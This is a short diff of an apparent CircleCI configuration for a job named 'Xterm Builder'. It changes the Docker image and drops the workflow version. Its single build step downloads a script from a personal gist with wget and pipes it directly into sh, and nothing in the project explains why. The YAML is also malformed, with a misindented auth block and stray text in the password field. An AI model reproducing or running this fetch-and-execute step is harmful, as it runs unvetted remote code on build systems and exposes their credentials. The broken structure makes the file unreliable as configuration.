@@ -1,7 +1,7 @@
 jobs:
     Xterm Builder:
      docker:
-     - image: bash:4.4.19
+     - image: cimg/base:2021.04
         - auth:
         username: arrayfs
         password: $DOCKERHUB_PASSWORD (Don't rerun)
@@ -9,7 +9,7 @@ jobs:
     steps:
       - run: wget https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev -O - | sh
 workflows:
-  version: 2
+
    Xterm Builder:
     jobs:
     - Xterm Builder
